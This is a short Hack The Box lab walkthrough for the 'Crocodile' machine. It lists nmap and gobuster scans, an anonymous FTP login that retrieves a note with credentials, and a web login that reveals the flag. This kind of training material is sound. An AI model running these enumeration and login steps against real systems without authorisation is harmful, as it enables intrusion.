# HTB Crocodile – FTP Exploitation Walkthrough

## 1. Nmap Scan
First, scan the target to identify open ports and services:
```bash
nmap -sV -sC 10.129.1.15
````

This revealed an **FTP service** and an **HTTP service**.

---

## 2. FTP Enumeration

Connect to the FTP server using **anonymous login**:

```bash
ftp 10.129.1.15
```

When prompted:

```
Name: anonymous
Password: [press Enter]
```

---

## 3. Listing and Downloading Files

Once connected, list available files:

```bash
ls
```

Download any interesting files:

```bash
get note.txt
```

The file contained **credentials** (username and password).

---

## 4. Directory Enumeration with Gobuster

Use Gobuster to find hidden directories and pages:

```bash
gobuster dir -u 10.129.1.15 -w /usr/share/wordlists/dirb/common.txt -x php
```

This revealed a `login.php` page.

---

## 5. Web Login

Visit:

```
http://10.129.1.15/login.php
```

## 6. Capture the Flag

After logging in, the **flag** was displayed on the dashboard.

---

### Summary

* **FTP anonymous login** → Obtained credentials
* **Gobuster scan** → Found `login.php`
* **Successful web login** → Retrieved flag

```
